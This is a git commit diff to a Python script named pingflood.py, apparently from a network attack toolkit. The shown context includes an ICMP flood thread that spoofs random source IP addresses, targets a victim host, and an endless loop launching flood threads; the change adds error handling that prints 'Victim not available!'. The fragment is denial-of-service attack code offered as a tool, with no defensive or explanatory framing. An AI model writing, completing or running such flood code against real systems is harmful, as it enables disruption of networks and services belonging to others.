e619894f1afad79f024da1ce20cdb023dda4b786
Aiden Pearce <32305640+aidenpearce01@users.noreply.github.com>
2017-11-10 15:09:13 +0700

    ping flood

--- Layer3-4/pingflood.py
+++ Layer3-4/pingflood.py
@@ -25,6 +25,11 @@ class icmpflood(threading.Thread):
 			i = IP()
 			i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
 			packet = IP(dst=target)/ICMP(type=8 ,code=0)
+	except KeyboardInterrupt:
+		sys.exit(1)
+	except:
+		print 'Victim not available!'
+		sys.exit(1)
 
 while True:
 	icmpflood().start()
